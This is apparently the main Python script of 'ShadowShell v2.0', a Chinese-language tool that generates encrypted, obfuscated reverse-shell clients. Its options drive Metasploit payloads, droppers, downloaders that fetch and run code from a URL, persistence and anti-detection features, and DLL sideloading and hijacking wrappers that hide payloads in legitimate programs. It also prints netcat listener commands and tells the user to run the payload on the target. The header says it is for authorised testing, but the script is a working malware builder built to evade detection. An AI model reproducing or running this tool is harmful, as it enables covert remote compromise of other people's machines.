#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowShell v2.0 - 高级模块化Shell生成器
Advanced Modular Shell Generator

作者: Teror Fox (@sysfox)
GitHub: https://github.com/sysfox

提供加密的反向Shell客户端生成功能
用于渗透测试和安全研究 (仅限授权使用)
"""

import sys
import os
import random

# 导入模块
from modules import (
    AdvancedCipher, gene_advanced_key, remove_comments_from_code,
    gene_code, gene_code_obfuscated, advanced_obfuscate_code,
    gene_shell, create_payload_dropper, create_downloader,
    create_white_black_payload, create_dll_sideloading_payload, create_hijacking_payload,
    MSFIntegration, create_msf_shell_wrapper, get_msf_config_recommendations,
    validate_ip, validate_port, create_config_file, print_results,
    interactive_mode, command_line_mode
)


def main():
    """主函数"""
    try:
        # 检查是否有命令行参数
        if len(sys.argv) > 1:
            args = command_line_mode()
            
            # 处理配置导入
            if hasattr(args, 'import_config') and args.import_config:
                from modules.config_manager import ConfigManager
                manager = ConfigManager()
                imported_config = manager.import_config(args.import_config)
                if not imported_config:
                    print("❌ 配置导入失败，使用默认配置")
                    return 1
                config = imported_config
            else:
                config = {
                    'ip': args.ip,
                    'port': args.port,
                    'encryption_level': args.encryption_level,
                    'retry': args.retry,
                    'delay': args.delay,
                    'key_length': args.key_length,
                    'output_dir': args.output,
                    'filename': args.filename,
                    'persistence': args.persistence,
                    'anti_detection': args.anti_detection,
                    'daemon_mode': getattr(args, 'daemon', False),
                    'use_dropper': args.use_dropper,
                    'use_white_black': args.use_white_black,
                    'white_black_mode': args.white_black_mode,
                    'use_downloader': args.use_downloader,
                    'download_url': args.download_url,
                    'downloader_silent': args.downloader_silent,
                    'silent_delay': args.silent_delay,
                    'use_msf': args.use_msf,
                    'msf_payload': args.msf_payload,
                    'msf_encoder': args.msf_encoder,
                    'msf_iterations': args.msf_iterations,
                    'msf_format': args.msf_format,
                    # 新增优化参数
                    'debug': getattr(args, 'debug', False),
                    'strict_mode': not getattr(args, 'no_strict', False),
                    'test_connection': getattr(args, 'test_connection', False),
                    'benchmark': getattr(args, 'benchmark', False)
                }
            
            # 处理配置导出
            if hasattr(args, 'export_config') and args.export_config:
                from modules.config_manager import ConfigManager
                manager = ConfigManager()
                if manager.export_config(config, args.export_config):
                    print("✅ 配置导出完成")
                return 0
            
            quiet = args.quiet
        else:
            config = interactive_mode()
            quiet = False
            config['silent_delay'] = config.get('silent_delay', 30)  # 默认值
        
        # 验证输入
        if not validate_ip(config['ip']):
            print("❌ IP地址格式不正确")
            sys.exit(1)
        
        if not validate_port(str(config['port'])):
            print("❌ 端口号不正确")
            sys.exit(1)
        
        # 网络连通性测试
        if config.get('test_connection', False):
            if not quiet:
                print("\n🌐 正在测试网络连通性...")
            try:
                from modules.network_test import comprehensive_network_test
                if not comprehensive_network_test(config['ip'], config['port']):
                    print("⚠️ 网络连通性测试失败，但继续生成载荷")
                else:
                    print("✅ 网络连通性测试通过")
            except Exception as e:
                print(f"⚠️ 网络测试异常: {e}")
        
        # 性能基准测试
        if config.get('benchmark', False):
            if not quiet:
                print("\n⏱️ 正在运行性能基准测试...")
            try:
                import time
                
                test_data = "Performance test data " * 100  # ~2KB
                cipher = AdvancedCipher("benchmark_key", config['encryption_level'])
                
                # 加密性能测试
                start_time = time.time()
                for _ in range(100):
                    encrypted = cipher.multi_layer_encrypt(test_data)
                encrypt_time = time.time() - start_time
                
                # 解密性能测试  
                start_time = time.time()
                for _ in range(100):
                    decrypted = cipher.multi_layer_decrypt(encrypted)
                decrypt_time = time.time() - start_time
                
                print(f"📊 基准测试结果:")
                print(f"   加密性能: {encrypt_time:.3f}s (100次)")
                print(f"   解密性能: {decrypt_time:.3f}s (100次)")
                print(f"   平均延迟: {(encrypt_time + decrypt_time) / 200 * 1000:.2f}ms")
                
            except Exception as e:
                print(f"⚠️ 基准测试异常: {e}")
        
        # 创建输出目录
        os.makedirs(config['output_dir'], exist_ok=True)
        
        if not quiet:
            print("\n🔧 正在生成Shell...")
        
        # 检查是否使用MSF载荷
        if config.get('use_msf', False):
            # MSF载荷生成模式
            try:
                msf = MSFIntegration()
                if not msf.is_available():
                    print("❌ MSF/msfvenom 不可用，将使用标准反弹Shell")
                    config['use_msf'] = False
                else:
                    if not quiet:
                        print("🎯 正在生成MSF载荷...")
                    
                    # 生成MSF载荷
                    payload_data, msf_command = msf.generate_payload(
                        payload_type=config['msf_payload'],
                        ip=config['ip'],
                        port=config['port'],
                        format_type=config['msf_format'],
                        encoder=config.get('msf_encoder'),
                        iterations=config.get('msf_iterations', 3)
                    )
                    
                    # 创建MSF载荷包装器
                    msf_wrapper_code = create_msf_shell_wrapper(
                        payload_data=payload_data,
                        format_type=config['msf_format'],
                        anti_detection=config['anti_detection'],
                        obfuscate=True
                    )
                    
                    # 清理MSF包装器代码中的注释
                    msf_wrapper_code = remove_comments_from_code(msf_wrapper_code)
                    
                    # 可选加密MSF载荷
                    if config['anti_detection']:
                        key = gene_advanced_key(config['key_length'])
                        cipher = AdvancedCipher(key, config.get('encryption_level', 'advanced'))
                        encrypted_code = cipher.multi_layer_encrypt(msf_wrapper_code)
                        
                        # 生成加密的MSF Shell文件
                        filepath = gene_shell(
                            encrypted_code, 
                            key, 
                            config['output_dir'], 
                            config['filename'],
                            config['persistence'],
                            config['anti_detection'],
                            config.get('silent_delay', 30),
                            config.get('debug', False),
                            config.get('strict_mode', True),
                            config.get('daemon_mode', False)
                        )
                    else:
                        # 直接保存MSF包装器  
                        if config['filename']:
                            filename = config['filename']
                        else:
                            msf_names = [
                                "msf_client.py", "network_client.py", "system_client.py",
                                "remote_access.py", "connection_manager.py"
                            ]
                            filename = random.choice(msf_names)
                        
                        filepath = os.path.join(config['output_dir'], filename)
                        with open(filepath, 'w', encoding='utf-8') as f:
                            f.write(msf_wrapper_code)
                        
                        key = "MSF_RAW_PAYLOAD"  # 标识符
                    
                    # 创建配置文件
                    config_path = create_config_file(config['ip'], config['port'], key, filepath)
                    
                    # 生成监听器命令
                    listener_cmd = msf.create_listener_command(
                        config['msf_payload'], 
                        config['ip'], 
                        config['port']
                    )
                    
                    # 保存监听器命令到文件
                    listener_file = os.path.join(config['output_dir'], "listener_commands.txt")
                    with open(listener_file, 'w', encoding='utf-8') as f:
                        f.write(listener_cmd)
                        f.write(f"\n\n# MSF生成命令:\n# {msf_command}")
                    
                    # 打印结果
                    if not quiet:
                        print(f"\n✅ MSF载荷生成成功！")
                        print(f"📁 MSF载荷文件: {filepath}")
                        print(f"📁 配置文件: {config_path}")
                        print(f"📁 监听器命令: {listener_file}")
                        print(f"🎯 载荷类型: {config['msf_payload']}")
                        print(f"🔧 编码器: {config.get('msf_encoder', '无')}")
                        print(f"📋 输出格式: {config['msf_format']}")
                        print(f"🎧 监听器: 查看 {listener_file} 获取监听命令")
                        
                        if 'meterpreter' in config['msf_payload']:
                            print(f"\n⚠️  Meterpreter使用说明:")
                            print(f"   1. 使用msfconsole启动监听器")
                            print(f"   2. 在目标机器上运行: python3 {filepath}")
                            print(f"   3. 等待Meterpreter会话建立")
                        else:
                            print(f"\n⚠️  Shell使用说明:")
                            print(f"   1. 监听命令: nc -lvnp {config['port']}")
                            print(f"   2. 在目标机器上运行: python3 {filepath}")
                    
                    # 如果启用了下载器模式，也为MSF生成下载器
                    if config.get('use_downloader', False):
                        if not config.get('download_url'):
                            print("❌ 下载器模式需要指定下载URL")
                        else:
                            # 生成MSF下载器
                            downloader_filepath = create_downloader(
                                config['download_url'],
                                config.get('downloader_silent', True),
                                config['output_dir'],
                                filename=None
                            )
                            
                            if not quiet:
                                print(f"📁 MSF下载器文件: {downloader_filepath}")
                                print(f"🔗 下载URL: {config['download_url']}")
                    
                    # 白加黑技术 (如果启用)
                    if config.get('use_white_black', False):
                        if not quiet:
                            print("\n🎭 正在为MSF载荷生成白加黑包装...")
                        
                        try:
                            if config['white_black_mode'] == 'wrapper':
                                wb_filepath, wb_description = create_white_black_payload(
                                    encrypted_code if config['anti_detection'] else msf_wrapper_code, 
                                    key if config['anti_detection'] else "MSF_WRAPPER", 
                                    config['output_dir'], "auto"
                                )
                                if not quiet:
                                    print(f"✅ MSF白加黑载荷生成成功!")
                                    print(f"📁 白加黑文件: {wb_filepath}")
                                    print(f"📋 包装类型: {wb_description}")
                                    
                        except Exception as e:
                            print(f"❌ MSF白加黑载荷生成失败: {str(e)}")
                    
                    return  # MSF模式完成，退出
                    
            except Exception as e:
                print(f"❌ MSF载荷生成失败: {str(e)}")
                print("💡 将回退到标准反弹Shell模式")
                config['use_msf'] = False
        
        # 检查是否使用下载器模式
        if config.get('use_downloader', False):
            # 下载器模式 - 生成两个文件
            if not config.get('download_url'):
                print("❌ 下载器模式需要指定下载URL")
                sys.exit(1)
                
            # 生成主程序（正常的Shell）
            if config['use_dropper']:
                raw_code = gene_code_obfuscated(config['ip'], config['port'], config['retry'], config['delay'])
            else:
                raw_code = gene_code(config['ip'], config['port'], config['retry'], config['delay'])
                
            raw_code = advanced_obfuscate_code(raw_code)
            
            # 清理代码中的注释，确保加密前代码干净
            raw_code = remove_comments_from_code(raw_code)
            
            key = gene_advanced_key(config['key_length'])
            
            cipher = AdvancedCipher(key, config.get('encryption_level', 'advanced'))
            encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
            
            # 生成主Shell文件
            if config['use_dropper']:
                main_filepath = create_payload_dropper(encrypted_code, key, config['output_dir'])
            else:
                main_filepath = gene_shell(
                    encrypted_code, 
                    key, 
                    config['output_dir'], 
                    config['filename'],
                    config['persistence'],
                    config['anti_detection'],
                    config.get('silent_delay', 30),
                    config.get('debug', False),
                    config.get('strict_mode', True),
                    config.get('daemon_mode', False)
                )
            
            # 2. 生成下载器文件
            downloader_filepath = create_downloader(
                config['download_url'],
                config.get('downloader_silent', True),
                config['output_dir'],
                filename=None  # 让函数自动生成下载器文件名
            )
            
            # 创建配置文件
            config_path = create_config_file(config['ip'], config['port'], key, main_filepath)
            
            # 打印结果
            if not quiet:
                print(f"\n✅ 下载器模式完成！")
                print(f"📁 主程序文件: {main_filepath}")
                print(f"📁 下载器文件: {downloader_filepath}")
                print(f"📁 配置文件: {config_path}")
                print(f"🔗 下载URL: {config['download_url']}")
                print(f"🔇 下载器静默: {'是' if config.get('downloader_silent', True) else '否'}")
                print(f"\n⚠️  使用说明:")
                print(f"   1. 将主程序文件上传到: {config['download_url']}")
                print(f"   2. 运行下载器文件来自动下载并执行主程序")
                print(f"   3. 监听命令: nc -lvnp {config['port']}")
            
        else:
            # 标准模式
            if config['use_dropper']:
                raw_code = gene_code_obfuscated(config['ip'], config['port'], config['retry'], config['delay'])
            else:
                raw_code = gene_code(config['ip'], config['port'], config['retry'], config['delay'])
                
            raw_code = advanced_obfuscate_code(raw_code)
            
            # 清理代码中的注释，确保加密前代码干净
            raw_code = remove_comments_from_code(raw_code)
            
            key = gene_advanced_key(config['key_length'])
            
            cipher = AdvancedCipher(key, config.get('encryption_level', 'advanced'))
            encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
            
            # 生成Shell文件
            if config['use_dropper']:
                filepath = create_payload_dropper(encrypted_code, key, config['output_dir'])
            else:
                filepath = gene_shell(
                    encrypted_code, 
                    key, 
                    config['output_dir'], 
                    config['filename'],
                    config['persistence'],
                    config['anti_detection'],
                    config.get('silent_delay', 30),
                    config.get('debug', False),
                    config.get('strict_mode', True),
                    config.get('daemon_mode', False)
                )
            
            # 创建配置文件
            config_path = create_config_file(config['ip'], config['port'], key, filepath)
            
            # 打印结果
            print_results(filepath, config_path, key, config, quiet)
            
        # 检查是否使用白加黑技术
        if config.get('use_white_black', False):
            if not quiet:
                print("\n🎭 正在生成白加黑载荷...")
            
            try:
                if config['white_black_mode'] == 'wrapper':
                    # 合法程序包装模式
                    wb_filepath, wb_description = create_white_black_payload(
                        encrypted_code, key, config['output_dir'], "auto"
                    )
                    if not quiet:
                        print(f"✅ 白加黑载荷生成成功!")
                        print(f"📁 白加黑文件: {wb_filepath}")
                        print(f"📋 包装类型: {wb_description}")
                        print(f"🎯 使用方法: 直接运行该文件，载荷将在后台执行")
                
                elif config['white_black_mode'] == 'sideloading':
                    # DLL侧加载模式
                    cpp_file, bat_file = create_dll_sideloading_payload(
                        encrypted_code, key, config['output_dir']
                    )
                    if not quiet:
                        print(f"✅ DLL侧加载载荷生成成功!")
                        print(f"📁 源码文件: {cpp_file}")
                        print(f"📁 编译脚本: {bat_file}")
                        print(f"🛠️  使用方法: 运行编译脚本生成DLL，然后部署到目标程序目录")
                
                elif config['white_black_mode'] == 'hijacking':
                    # DLL劫持模式
                    hijack_files = create_hijacking_payload(
                        encrypted_code, key, config['output_dir']
                    )
                    if not quiet:
                        print(f"✅ DLL劫持载荷生成成功!")
                        print(f"📁 生成文件数: {len(hijack_files)}")
                        for file in hijack_files:
                            print(f"   - {file}")
                        print(f"📖 查看使用说明: DLL_Hijacking_README.txt")
                        
            except Exception as e:
                print(f"❌ 白加黑载荷生成失败: {str(e)}")
    
    except KeyboardInterrupt:
        print("\n\n❌ 用户中断操作")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ 发生错误: {str(e)}")
        sys.exit(1)


if __name__ == '__main__':
    main()
